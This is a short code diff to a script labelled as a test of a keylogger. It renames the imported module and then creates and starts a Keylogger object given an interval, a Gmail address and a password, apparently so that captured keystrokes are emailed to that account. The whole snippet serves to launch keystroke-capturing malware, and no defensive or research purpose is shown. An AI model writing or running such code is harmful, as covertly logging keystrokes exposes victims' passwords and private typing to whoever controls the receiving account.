@@ -2,7 +2,7 @@
 
 # Testing the keylogger
 
-import keylogger
+import zkeylogger
 
-zlogger = keylogger.Keylogger(360, "username@gmail.com", "password")
+zlogger = zkeylogger.Keylogger(360, "username@gmail.com", "password")
 zlogger.start()
